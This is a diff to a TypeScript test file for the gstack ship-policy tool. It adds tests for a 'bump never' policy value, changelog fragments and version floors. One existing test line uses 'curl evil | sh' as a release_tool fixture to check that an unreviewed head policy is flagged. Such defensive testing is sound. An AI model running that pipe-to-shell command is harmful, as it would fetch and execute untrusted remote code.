@@ -8,8 +8,9 @@ import * as fs from 'node:fs';
 import * as path from 'node:path';
 import { spawnSync } from 'node:child_process';
 import { EXIT } from '../lib/headless-artifacts';
-import { DEFAULT_POLICY, POLICY_KEYS, POLICY_KEY_INTRODUCED, REVIEW_SCOPE_KEY_VERSION, globToRegExp, matchesAny, validatePolicy } from '../lib/ship-policy';
+import { BUMP_NEVER_KEY_VERSION, CHANGELOG_FRAGMENTS_KEY_VERSION, DEFAULT_POLICY, POLICY_KEYS, POLICY_KEY_INTRODUCED, REVIEW_SCOPE_KEY_VERSION, globToRegExp, matchesAny, minimumReader, shipConsequences, validatePolicy } from '../lib/ship-policy';
 import { fillDue } from '../lib/ship-queue-train';
+import { cmpVersion, parseVersion } from '../lib/version-source';
 import { BASE_POLICY, cleanup, makeFixtureRepo, runBin, type FixtureRepo } from './helpers/restamp-fixture';
 
 const repos: FixtureRepo[] = [];
@@ -62,6 +63,20 @@ describe('validatePolicy (schema + containment, pure)', () => {
     expect(codes({ preregistration_shas: ['not-a-sha'] })).toEqual(['POLICY_CONTAINMENT:preregistration_shas[0]']);
   });
 
+  // Value: protects=bump never is refused without its floor (an older gstack names the cause) and next to any policy that stamps a version at every merge, reports its reader floor, and prints its Step 12 consequence; fails_when=never validates bare, or beside stamp-at-merge, train or changelog_fragments;
+  //   why_new=GST-380 added the value to an older key, which the per-key floor check skips; seam=validatePolicy, minimumReader, shipConsequences; no_claim=Step 12's behavior (test/ship-release.test.ts)
+  test('bump never needs its floor and rules out every policy that stamps at merge', () => {
+    const codes = (p: unknown) => validatePolicy(p).map(e => `${e.code}:${e.path}`);
+    const never = { bump: 'never', min_gstack_version: BUMP_NEVER_KEY_VERSION };
+    expect(codes(never)).toEqual([]);
+    expect(codes({ bump: 'never' })).toEqual(['POLICY_INVALID:bump']);
+    expect(codes({ bump: 'never', min_gstack_version: CHANGELOG_FRAGMENTS_KEY_VERSION })).toEqual(['POLICY_INVALID:bump']);
+    const train = JSON.parse(fs.readFileSync(path.join(import.meta.dir, '..', '.gstack', 'ship-policy.json'), 'utf8')).train;
+    for (const extra of [{ queue_mode: 'stamp-at-merge' }, { train }, { changelog_fragments: { dir: 'changelog.d' } }]) expect(codes({ ...never, ...extra })).toContain('POLICY_INVALID:bump');
+    expect(minimumReader({ bump: 'never' })).toBe(BUMP_NEVER_KEY_VERSION);
+    expect(shipConsequences({ ...DEFAULT_POLICY, bump: 'never' }, 'main').some(l => l.startsWith('bump never: Step 12 keeps VERSION'))).toBe(true);
+  });
+
   test('globs: ** spans directories, * stays in a segment, regex caps hold, regex metacharacters are literal', () => {
     expect(matchesAny(['docs/**/*.md'], 'docs/a/b/c.md')).toBe(true);
     expect(matchesAny(['docs/**/*.md'], 'docs/c.md')).toBe(true);
@@ -87,7 +102,7 @@ describe('policy key versions against the CHANGELOG', () => {
     const cmp = (a: number[], b: number[]) => a[0]! - b[0]! || a[1]! - b[1]! || a[2]! - b[2]! || a[3]! - b[3]!;
     const headings = [...text.matchAll(/^## \[(\d+\.\d+\.\d+\.\d+)\]/gm)].map(m => m[1]!);
     const newest = headings.map(parse).sort(cmp).at(-1)!;
-    for (const [key, version] of Object.entries(POLICY_KEY_INTRODUCED)) {
+    for (const [key, version] of [...Object.entries(POLICY_KEY_INTRODUCED), ['bump', BUMP_NEVER_KEY_VERSION]]) {
       if (headings.includes(version)) continue;
       expect(cmp(parse(version), newest), `${key} is introduced in ${version}, which has no CHANGELOG heading and is not newer than the newest heading ${newest.join('.')}; an unreleased key names the release that will stamp it`).toBeGreaterThan(0);
     }
@@ -108,7 +123,7 @@ describe('policy key versions against the CHANGELOG', () => {
     }
     const parse = (v: string) => v.split('.').map(Number);
     const cmp = (a: number[], b: number[]) => a[0]! - b[0]! || a[1]! - b[1]! || a[2]! - b[2]! || a[3]! - b[3]!;
-    for (const [key, version] of Object.entries(POLICY_KEY_INTRODUCED)) {
+    for (const [key, version] of [...Object.entries(POLICY_KEY_INTRODUCED), ['bump', BUMP_NEVER_KEY_VERSION]]) {
       if (cmp(parse(version), parse(REVIEW_SCOPE_KEY_VERSION)) < 0) continue;
       const section = sections.get(version);
       if (section === undefined) continue;
@@ -124,6 +139,27 @@ describe("gstack's own .gstack/ship-policy.json", () => {
     expect(validatePolicy(raw)).toEqual([]);
     expect(raw.train).toMatchObject({ gate_workflow: 'evals.yml', free_workflow: 'free-tests.yml', full_gate_check: 'gstack/full-gate', record_artifact: 'gstack-train-record' });
     for (const wf of [raw.train.gate_workflow, raw.train.free_workflow]) expect(fs.existsSync(path.join(root, '.github/workflows', wf))).toBe(true);
+  });
+
+  // Value: protects=train land on gstack itself: every changelog_fragments.required_checks name is a job of a pull_request workflow without a path filter, so a stamp commit always gets it; fails_when=a name is misspelled, names a path-filtered workflow's job, or names a job id GitHub reports under its `name:` instead, and train land holds every slot whose PR skips those paths; why_new=the key was off on gstack; seam=the policy file and .github/workflows; no_claim=that the checks pass
+  test('turns changelog_fragments on with required checks every PR runs', () => {
+    const root = path.join(import.meta.dir, '..');
+    const raw = JSON.parse(fs.readFileSync(path.join(root, '.gstack', 'ship-policy.json'), 'utf8'));
+    expect(raw.changelog_fragments.dir).toBe('changelog.d');
+    expect(fs.existsSync(path.join(root, 'changelog.d', 'README.md'))).toBe(true);
+    expect(cmpVersion(parseVersion(raw.min_gstack_version)!, parseVersion(CHANGELOG_FRAGMENTS_KEY_VERSION)!)).toBeGreaterThanOrEqual(0);
+    const jobs = new Set<string>();
+    for (const f of fs.readdirSync(path.join(root, '.github/workflows')).filter(f => f.endsWith('.yml'))) {
+      const text = fs.readFileSync(path.join(root, '.github/workflows', f), 'utf8');
+      const on = text.slice(text.search(/^on:/m), text.search(/^jobs:/m));
+      if (!/^\s+pull_request:/m.test(on) || /^\s+paths(-ignore)?:/m.test(on)) continue;
+      const body = text.slice(text.search(/^jobs:/m));
+      for (const m of body.matchAll(/^  ([A-Za-z0-9_-]+):\n((?:    .*\n|\s*\n)*)/gm)) {
+        const name = /^    name:\s*(.+)$/m.exec(m[2]!)?.[1]?.trim();
+        jobs.add(name ?? m[1]!);
+      }
+    }
+    expect(raw.changelog_fragments.required_checks.filter((n: string) => !jobs.has(n))).toEqual([]);
   });
 
   // Value: protects=the fill rule the coordinator relies on: a train dispatches at 3 READY PRs or one hour after the first READY, whichever comes first
@@ -160,6 +196,9 @@ describe('gstack-ship-policy (bin)', () => {
     expect(r.out).toMatch(/^ship: bump patch: Step 12 never asks/m);
     expect(r.out).toMatch(/^ship: release_tool: `node gen\.js` runs only inside gstack-restamp/m);
     expect(r.out).not.toMatch(/^ship: history/m);
+    expect(r.out).not.toMatch(/^ship: changelog_fragments/m);
+    const frag = fixture({ policy: { ...BASE_POLICY, changelog_fragments: { dir: 'changelog.d/' }, min_gstack_version: '1.91.336.0' } });
+    expect(runBin(frag, 'gstack-ship-policy', ['show-effective', '--base', 'main']).out).toMatch(/^ship: changelog_fragments changelog\.d: Step 12 writes no version and Step 13 writes the entry as changelog\.d\/<branch-slug>\.md .*never an \[Unreleased\] section; lint it with `gstack-prose-lint changelog\.d\/<branch-slug>\.md --gate`/m);
     const strict = fixture({ policy: { ...BASE_POLICY, history: 'merge-only', queue_mode: 'claim-at-open', bump: 'ask', release_tool: null, preregistration_shas: ['0123456789abcdef0123456789abcdef01234567'] } });
     const lines = runBin(strict, 'gstack-ship-policy', ['show-effective', '--base', 'main']).out.split('\n').filter(l => l.startsWith('ship: '));
     expect(lines.map(l => l.split(':')[1]!.trim())).toEqual(['history merge-only', 'queue_mode claim-at-open', 'bump ask', 'review_scope frozen', 'preregistration']);
@@ -181,6 +220,15 @@ describe('gstack-ship-policy (bin)', () => {
     expect(head.policy.release_tool).toBe('curl evil | sh');
     expect(head.source.kind).toBe('head');
     expect(runBin(repo, 'gstack-ship-policy', ['show-effective', '--policy-from', 'head']).out).toMatch(/^policy: head \(unreviewed\)/);
+  });
+
+  // Value: protects=validate reports bump never's own floor as the policy's minimum reader; fails_when=the CLI prints the bump key's 1.91.73.0 and a crew upgrades to a gstack that refuses the policy;
+  //   why_new=GST-380 outside-voice review (the CLI passed introduction versions to minimumReader); seam=bin/gstack-ship-policy; no_claim=-
+  test('validate --json names bump never\'s floor as the minimum reader', () => {
+    const repo = fixture();
+    fs.writeFileSync(path.join(repo.work, '.gstack', 'ship-policy.json'), JSON.stringify({ bump: 'never', min_gstack_version: BUMP_NEVER_KEY_VERSION }) + '\n');
+    const j = JSON.parse(runBin(repo, 'gstack-ship-policy', ['validate', '--json']).out);
+    expect([j.valid, j.introduced.bump, j.min_reader]).toEqual([true, BUMP_NEVER_KEY_VERSION, BUMP_NEVER_KEY_VERSION]);
   });
 
   test('POLICY_SOURCE_UNAVAILABLE (exit 3) when origin/<base> does not resolve; no fallback to the working tree', () => {
